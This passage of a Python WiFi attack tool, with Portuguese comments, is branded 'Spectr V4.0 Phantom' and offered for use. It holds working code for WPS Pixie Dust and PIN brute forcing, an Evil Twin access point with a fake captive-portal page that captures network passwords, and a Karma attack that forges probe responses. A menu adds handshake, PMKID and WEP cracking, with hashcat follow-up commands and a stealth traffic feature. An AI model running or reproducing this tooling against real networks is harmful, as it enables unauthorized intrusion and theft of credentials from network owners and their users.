                        self.log.progress(f"Testando PIN: {pin_match.group(1)}")
                
                # Check success
                if 'WPS PIN:' in line:
                    pin_match = re.search(r'WPS PIN: (\d+)', line)
                    if pin_match:
                        pin = pin_match.group(1)
                        self.log.success(f"WPS PIN encontrado: {pin}")
                        
                        # Aguarda PSK
                        for _ in range(10):
                            line = proc.stdout.readline()
                            if 'WPA PSK:' in line:
                                psk_match = re.search(r'WPA PSK: (.*)', line)
                                if psk_match:
                                    psk = psk_match.group(1)
                                    self.log.success(f"WPA PSK: {psk}")
                                    return {'pin': pin, 'psk': psk}
                        
                        return {'pin': pin, 'psk': None}
            
            proc.terminate()
            self.log.error("WPS bruteforce timeout")
            
        except Exception as e:
            self.log.error(f"Erro no WPS bruteforce: {e}")
        
        return None
    
    def attack(self):
        """Tenta Pixie Dust primeiro, depois bruteforce se falhar"""
        self.log.info("Fase 1: Pixie Dust Attack")
        result = self.pixie_dust_attack()
        
        if result:
            return result
        
        self.log.info("Fase 2: Online Bruteforce (opcional)")
        return self.online_bruteforce(timeout=CONFIG['wps_pin_timeout'])
# ============================================================================
# EVIL TWIN ATTACK
# ============================================================================

class EvilTwinAttack:
    def __init__(self, interface, target, log):
        self.interface = interface
        self.target = target
        self.log = log
        self.fake_ap_running = False
        self.credentials = []
        self.server = None
        self.server_thread = None
        
    def create_hostapd_config(self):
        """Cria configuração hostapd para fake AP"""
        ssid = self.target['ssid']
        channel = self.target['channel']
        
        # Usa MAC similar ao original (muda último byte)
        original_mac = self.target['bssid']
        fake_mac = ':'.join(original_mac.split(':')[:-1] + 
                           [f"{(int(original_mac.split(':')[-1], 16) + 1) % 256:02x}"])
        
        config = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
"""
        
        config_path = os.path.join(CONFIG['temp_dir'], 'hostapd_evil.conf')
        
        with open(config_path, 'w') as f:
            f.write(config)
        
        os.chmod(config_path, 0o600)
        cleanup_handler.register_temp_file(config_path)
        
        return config_path
    
    def create_dnsmasq_config(self):
        """Cria configuração dnsmasq para DHCP e DNS"""
        config = f"""
interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        
        config_path = os.path.join(CONFIG['temp_dir'], 'dnsmasq_evil.conf')
        
        with open(config_path, 'w') as f:
            f.write(config)
        
        os.chmod(config_path, 0o600)
        cleanup_handler.register_temp_file(config_path)
        
        return config_path
    
    def create_captive_portal(self):
        """Cria página HTML de captive portal falsa"""
        ssid = self.target['ssid']
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autenticação de Rede</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            padding: 40px;
        }}
        
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .logo svg {{
            width: 60px;
            height: 60px;
            fill: #667eea;
        }}
        
        h1 {{
            text-align: center;
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }}
        
        .subtitle {{
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }}
        
        .network-info {{
            background: #f5f5f5;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .network-name {{
            font-weight: 600;
            color: #333;
            font-size: 16px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        label {{
            display: block;
            color: #555;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }}
        
        input {{
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
        }}
        
        input:focus {{
            outline: none;
            border-color: #667eea;
        }}
        
        button {{
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }}
        
        button:hover {{
            transform: translateY(-2px);
        }}
        
        button:active {{
            transform: translateY(0);
        }}
        
        .security-note {{
            text-align: center;
            color: #999;
            font-size: 12px;
            margin-top: 20px;
        }}
        
        .loading {{
            display: none;
            text-align: center;
            margin-top: 20px;
        }}
        
        .spinner {{
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24">
                <path d="M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9M12,15A4,4 0 0,0 8,19A4,4 0 0,0 12,23A4,4 0 0,0 16,19A4,4 0 0,0 12,15Z"/>
            </svg>
        </div>
        
        <h1>Autenticação Necessária</h1>
        <p class="subtitle">Conecte-se à rede segura</p>
        
        <div class="network-info">
            <div class="network-name">{ssid}</div>
        </div>
        
        <form id="authForm" action="/authenticate" method="POST">
            <div class="form-group">
                <label for="password">Senha da Rede</label>
                <input type="password" id="password" name="password" 
                       placeholder="Digite a senha" required autofocus>
            </div>
            
            <button type="submit">Conectar</button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 10px; color: #666;">Autenticando...</p>
            </div>
        </form>
        
        <p class="security-note">
            🔒 Conexão segura e criptografada
        </p>
    </div>
    
    <script>
        document.getElementById('authForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            document.querySelector('button').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            var password = document.getElementById('password').value;
            
            fetch('/authenticate', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/x-www-form-urlencoded',
                }},
                body: 'password=' + encodeURIComponent(password)
            }})
            .then(response => response.text())
            .then(data => {{
                // Simula autenticação bem-sucedida
                setTimeout(function() {{
                    document.querySelector('.container').innerHTML = 
                        '<div style="text-align: center; padding: 40px 20px;">' +
                        '<svg viewBox="0 0 24 24" style="width: 80px; height: 80px; fill: #4CAF50; margin-bottom: 20px;">' +
                        '<path d="M9,20.42L2.79,14.21L5.62,11.38L9,14.77L18.88,4.88L21.71,7.71L9,20.42Z"/>' +
                        '</svg>' +
                        '<h2 style="color: #4CAF50; margin-bottom: 10px;">Conectado!</h2>' +
                        '<p style="color: #666;">Você está conectado à rede {ssid}</p>' +
                        '</div>';
                }}, 2000);
            }});
        }});
    </script>
</body>
</html>
"""
        
        portal_path = os.path.join(CONFIG['webroot_dir'], 'index.html')
        
        with open(portal_path, 'w', encoding='utf-8') as f:
            f.write(html)
        
        return portal_path
    
    def start_web_server(self):
        """Inicia servidor HTTP para captive portal"""
        
        class CaptivePortalHandler(BaseHTTPRequestHandler):
            parent = self
            
            def log_message(self, format, *args):
                pass  # Silencia logs do servidor
            
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    with open(os.path.join(CONFIG['webroot_dir'], 'index.html'), 'rb') as f:
                        self.wfile.write(f.read())
                else:
                    # Redireciona tudo para index
                    self.send_response(302)
                    self.send_header('Location', '/')
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/authenticate':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    
                    params = parse_qs(post_data)
                    password = params.get('password', [''])[0]
                    
                    # Salva credencial
                    credential = {
                        'ssid': self.parent.target['ssid'],
                        'bssid': self.parent.target['bssid'],
                        'password': password,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.parent.credentials.append(credential)
                    self.parent.log.success(f"Credencial capturada: {password}")
                    
                    # Salva em arquivo
                    creds_file = os.path.join(CONFIG['captures_dir'], 'evil_twin_credentials.json')
                    
                    existing = []
                    if os.path.exists(creds_file):
                        with open(creds_file, 'r') as f:
                            existing = json.load(f)
                    
                    existing.append(credential)
                    atomic_write_json(creds_file, existing)
                    
                    # Responde
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'OK')
        
        self.server = HTTPServer(('10.0.0.1', CONFIG['evil_twin_port']), CaptivePortalHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.server_thread.start()
        
        cleanup_handler.register_server(self.server)
        
        self.log.success(f"Servidor captive portal rodando em http://10.0.0.1:{CONFIG['evil_twin_port']}")
    
    def setup_network(self):
        """Configura rede fake"""
        try:
            # Configura IP
            subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
                         stderr=subprocess.DEVNULL)
            subprocess.run(['ip', 'addr', 'add', '10.0.0.1/24', 'dev', self.interface],
                         check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                         check=True)
            
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            self.log.success("Network configurada")
            return True
            
        except Exception as e:
            self.log.error(f"Erro configurando network: {e}")
            return False
    
    def attack(self, duration=300):
        """Executa Evil Twin attack completo"""
        self.log.info(f"Iniciando Evil Twin attack contra {self.target['ssid']}")
        
        # Restaura interface para managed (hostapd precisa)
        subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                     stderr=subprocess.DEVNULL)
        subprocess.run(['iw', self.interface, 'set', 'type', 'managed'],
                     stderr=subprocess.DEVNULL)
        subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                     stderr=subprocess.DEVNULL)
        
        # Setup network
        if not self.setup_network():
            return None
        
        # Cria configs
        hostapd_conf = self.create_hostapd_config()
        dnsmasq_conf = self.create_dnsmasq_config()
        self.create_captive_portal()
        
        # Inicia hostapd (fake AP)
        self.log.info("Iniciando fake AP (hostapd)...")
        hostapd_proc = subprocess.Popen(['hostapd', hostapd_conf],
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
        cleanup_handler.register_process(hostapd_proc)
        time.sleep(3)
        
        # Inicia dnsmasq (DHCP + DNS)
        self.log.info("Iniciando DHCP/DNS (dnsmasq)...")
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', dnsmasq_conf, '-d'],
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
        cleanup_handler.register_process(dnsmasq_proc)
        time.sleep(2)
        
        # Inicia web server
        self.start_web_server()
        
        # Deauth AP real para forçar clientes a conectar no fake
        self.log.info("Deauthing AP real para forçar clientes ao fake AP...")
        
        def continuous_deauth():
            deauther = DeauthAttacker(self.interface, self.log)
            while self.fake_ap_running:
                # Precisa de segunda interface para deauth enquanto fake AP roda
                # Por simplicidade, assume que clientes vão conectar naturalmente
                time.sleep(10)
        
        self.fake_ap_running = True
        
        self.log.success("="*60)
        self.log.success("Evil Twin AP ativo!")
        self.log.success(f"SSID: {self.target['ssid']}")
        self.log.success(f"Portal: http://10.0.0.1:{CONFIG['evil_twin_port']}")
        self.log.success("Aguardando clientes se conectarem...")
        self.log.success("="*60)
        
        # Aguarda credenciais
        start_time = time.time()
        while time.time() - start_time < duration:
            if self.credentials:
                self.log.info(f"Total de credenciais capturadas: {len(self.credentials)}")
            time.sleep(10)
        
        self.fake_ap_running = False
        
        # Cleanup
        hostapd_proc.terminate()
        dnsmasq_proc.terminate()
        
        if self.credentials:
            return self.credentials
        else:
            self.log.warning("Nenhuma credencial capturada")
            return None


# ============================================================================
# KARMA ATTACK
# ============================================================================

class KarmaAttack:
    def __init__(self, interface, log):
        self.interface = interface
        self.log = log
        self.probe_requests = {}
        self.lock = threading.Lock()
        self.fake_aps = {}
        
    def packet_handler(self, pkt):
        """Captura probe requests de clientes"""
        if pkt.haslayer(Dot11ProbeReq):
            try:
                client_mac = pkt[Dot11].addr2
                
                # Extrai SSID do probe request
                ssid = None
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while isinstance(elt, Dot11Elt):
                        if elt.ID == 0:  # SSID
                            ssid = elt.info.decode('utf-8', errors='ignore')
                            break
                        elt = elt.payload
                
                if ssid and ssid.strip():  # Ignora broadcast probes
                    with self.lock:
                        if ssid not in self.probe_requests:
                            self.probe_requests[ssid] = set()
                        self.probe_requests[ssid].add(client_mac)
                        
                        self.log.success(f"Probe request: {client_mac} → {ssid}")
                        
            except:
                pass
    
    def respond_to_probes(self):
        """Responde probe requests criando fake APs"""
        def responder_loop():
            while True:
                with self.lock:
                    for ssid, clients in list(self.probe_requests.items()):
                        if ssid not in self.fake_aps:
                            # Cria fake AP para esse SSID
                            fake_bssid = generate_phantom_mac()
                            self.fake_aps[ssid] = fake_bssid
                            
                            self.log.info(f"Criando fake AP: {ssid} ({fake_bssid})")
                            
                            # Envia probe response para cada cliente
                            for client in clients:
                                self.send_probe_response(ssid, fake_bssid, client)
                
                time.sleep(0.5)
        
        thread = threading.Thread(target=responder_loop, daemon=True)
        thread.start()
    
    def send_probe_response(self, ssid, bssid, client):
        """Envia probe response fake"""
        try:
            dot11 = Dot11(type=0, subtype=5, addr1=client, addr2=bssid, addr3=bssid)
            
            probe_resp = Dot11ProbeResp(cap='ESS')
            
            essid = Dot11Elt(ID='SSID', info=ssid.encode(), len=len(ssid))
            rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
            dsset = Dot11Elt(ID='DSset', info=b'\x06')  # Channel 6
            
            frame = RadioTap()/dot11/probe_resp/essid/rates/dsset
            
            sendp(frame, iface=self.interface, verbose=False)
            
        except Exception as e:
            pass
    
    def attack(self, duration=300):
        """Executa Karma attack"""
        self.log.info("Iniciando Karma Attack (auto-connect exploitation)")
        self.log.info("Capturando probe requests e respondendo com fake APs...")
        
        # Inicia responder
        self.respond_to_probes()
        
        # Sniff probe requests
        sniff(iface=self.interface, prn=self.packet_handler, 
              timeout=duration, store=False)
        
        with self.lock:
            total_ssids = len(self.probe_requests)
            total_clients = sum(len(clients) for clients in self.probe_requests.values())
        
        self.log.success(f"Karma attack completo:")
        self.log.success(f"  SSIDs descobertos: {total_ssids}")
        self.log.success(f"  Clientes únicos: {total_clients}")
        
        # Salva lista de SSIDs
        ssids_file = CONFIG['karma_ssids_file']
        with open(ssids_file, 'w') as f:
            for ssid in self.probe_requests.keys():
                f.write(f"{ssid}\n")
        
        self.log.info(f"SSIDs salvos em: {ssids_file}")
        
        return dict(self.probe_requests)


# ============================================================================
# MAIN APPLICATION
# ============================================================================

def display_banner():
    banner = f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║          ███████╗██████╗ ███████╗ ██████╗████████╗██████╗    ║
    ║          ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗   ║
    ║          ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝   ║
    ║          ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗   ║
    ║          ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║   ║
    ║          ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝   ║
    ║                                                               ║
    ║                    V4.0_Phantom_Complete                     ║
    ║              Advanced WiFi Penetration Framework              ║
    ║                                                               ║
    ║              Author: Marina "Lich_Queen"                     ║
    ║              Version: {CONFIG['version']:<40}║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    [ATTACK VECTORS]
    ✓ WPA/WPA2 Handshake Capture
    ✓ PMKID Capture (Clientless)
    ✓ WEP Cracking (ARP Replay)
    ✓ WPS PIN Attack (Pixie Dust + Bruteforce)
    ✓ Evil Twin (Fake AP + Captive Portal)
    ✓ Karma Attack (Auto-connect Exploitation)
    
    [PHANTOM ENHANCEMENTS]
    ✓ AI-Powered Target Selection
    ✓ Stealth Mode & Traffic Disguise
    ✓ Adaptive Timing Engine
    ✓ Replay-Aware Capture
    ✓ Ultra-Secure MAC Generation
    """
    print(banner)


def select_attack_mode(log):
    """Menu de seleção de modo de ataque"""
    print("\n" + "="*70)
    print("MODOS DE ATAQUE DISPONÍVEIS:")
    print("="*70)
    print("[1] WPA/WPA2 Handshake Capture")
    print("[2] PMKID Capture (Clientless)")
    print("[3] WEP Cracking")
    print("[4] WPS Attack (Pixie Dust)")
    print("[5] Evil Twin (Fake AP + Phishing)")
    print("[6] Karma Attack (Probe Request Harvesting)")
    print("[7] Auto Mode (AI seleciona melhor ataque)")
    print("="*70)
    
    while True:
        try:
            choice = input("\n[?] Selecione o modo de ataque (1-7): ").strip()
            mode = int(choice)
            if 1 <= mode <= 7:
                return mode
        except:
            pass
        log.error("Seleção inválida. Tente novamente.")


def main():
    require_root()
    setup_secure_directories()
    
    log = ColoredLogger(CONFIG['log_file'])
    
    display_banner()
    
    # Check dependencies
    check_dependencies(log)
    
    # Detect interface
    interface = detect_wireless_interface()
    
    if not interface:
        log.error("Nenhuma interface wireless detectada")
        sys.exit(1)
    
    log.success(f"Interface detectada: {interface}")
    
    # Kill interfering processes
    kill_interfering_processes(log)
    
    # Enable monitor mode
    interface = ensure_monitor_mode(interface, log)
    
    if not interface:
        log.error("Falha ao ativar modo monitor")
        sys.exit(1)
    
    # Initialize components
    ai_selector = IntelligentTargetSelector()
    stealth = StealthTrafficGenerator(interface)
    stealth.start_background_noise(log)
    
    try:
        # Scan networks
        scanner = NetworkScanner(interface, log)
        networks = scanner.scan(duration=30, channels=list(range(1, 12)))
        
        if not networks:
            log.error("Nenhuma rede encontrada")
            return
        
        # Score targets com AI
        for net in networks:
            net['ai_score'] = ai_selector.score_target(net, log)
        
        # Sort por AI score
        networks.sort(key=lambda x: x['ai_score'], reverse=True)
        
        # Display targets
        print("\n" + "="*100)
        print(f"{'#':<4} {'SSID':<25} {'BSSID':<20} {'CH':<4} {'PWR':<5} {'Crypto':<15} {'Clients':<8} {'WPS':<5} {'Score':<6}")
        print("="*100)
        
        for i, net in enumerate(networks[:30], 1):
            ssid = net['ssid'][:24]
            bssid = net['bssid']
            channel = net.get('channel', '?')
            signal = net.get('signal', -100)
            crypto = ','.join(net.get('crypto', ['?']))[:14]
            num_clients = len(net.get('clients', []))
            wps = 'Yes' if net.get('wps') else 'No'
            score = net.get('ai_score', 0)
            
            print(f"{i:<4} {ssid:<25} {bssid:<20} {channel:<4} {signal:<5} {crypto:<15} {num_clients:<8} {wps:<5} {score:.2f}")
        
        print("="*100 + "\n")
        
        # Select target
        try:
            choice = int(input("[?] Selecione o target (número): ").strip())
            target = networks[choice - 1]
        except:
            log.error("Seleção inválida")
            return
        
        log.info(f"Target selecionado: {target['ssid']} ({target['bssid']})")
        log.info(f"AI Score: {target['ai_score']:.2f}")
        
        # Select attack mode
        attack_mode = select_attack_mode(log)
        
        result = None
        
        if attack_mode == 1:
            # WPA/WPA2 Handshake
            capturer = HandshakeCapture(interface, target, log)
            result = capturer.capture(timeout=120)
            
            if result:
                log.success("="*60)
                log.success("HANDSHAKE CAPTURADO!")
                log.success(f"Arquivo: {result}")
                log.success("="*60)
                log.info("\nPróximos passos:")
                log.info(f"1. hcxpcapngtool -o hash.hc22000 {result}")
                log.info(f"2. hashcat -m 22000 hash.hc22000 wordlist.txt")
        
        elif attack_mode == 2:
            # PMKID Capture
            pmkid = PMKIDCapture(interface, target, log)
            result = pmkid.capture(timeout=60)
            
            if result:
                log.success("="*60)
                log.success("PMKID CAPTURADO!")
                log.success(f"Arquivo: {result}")
                log.success("="*60)
        
        elif attack_mode == 3:
            # WEP Cracking
            if 'WEP' not in target.get('crypto', []):
                log.error("Target não usa WEP")
                return
            
            wep = WEPCracker(interface, target, log)
            result = wep.capture_ivs(duration=300)
            
            if result:
                log.success(f"WEP KEY: {result}")
        
        elif attack_mode == 4:
            # WPS Attack
            if not target.get('wps'):
                log.warning("WPS não detectado (pode estar oculto)")
            
            wps = WPSAttacker(interface, target, log)
            result = wps.attack()
            
            if result:
                log.success("="*60)
                log.success("WPS QUEBRADO!")
                log.success(f"PIN: {result.get('pin')}")
                if result.get('psk'):
                    log.success(f"PSK: {result.get('psk')}")
                log.success("="*60)
        
        elif attack_mode == 5:
            # Evil Twin
            evil = EvilTwinAttack(interface, target, log)
            result = evil.attack(duration=300)
            
            if result:
                log.success("="*60)
                log.success(f"CREDENCIAIS CAPTURADAS: {len(result)}")
                for cred in result:
                    log.success(f"  Password: {cred['password']}")
                log.success("="*60)
        
        elif attack_mode == 6:
            # Karma Attack
            karma = KarmaAttack(interface, log)
            result = karma.attack(duration=180)
            
            if result:
                log.success("="*60)
                log.success("KARMA ATTACK COMPLETO")
                log.success(f"SSIDs descobertos: {len(result)}")
                log.success("="*60)
        
        elif attack_mode == 7:
            # Auto Mode - AI decide
            log.info("Modo AUTO: AI selecionando melhor vetor de ataque...")
            
            crypto = target.get('crypto', [])
            
            if 'WEP' in crypto:
                log.info("AI decidiu: WEP Cracking")
                wep = WEPCracker(interface, target, log)
                result = wep.capture_ivs(duration=300)
            elif target.get('wps'):
                log.info("AI decidiu: WPS Attack")
                wps = WPSAttacker(interface, target, log)
                result = wps.attack()
            elif target.get('clients', []):
                log.info("AI decidiu: Handshake Capture")
                capturer = HandshakeCapture(interface, target, log)
                result = capturer.capture(timeout=120)
            else:
                log.info("AI decidiu: PMKID Capture (sem clientes)")
                pmkid = PMKIDCapture(interface, target, log)
                result = pmkid.capture(timeout=60)
        
    finally:
        stealth.stop()
        cleanup_handler.cleanup()


if __name__ == '__main__':
    main()
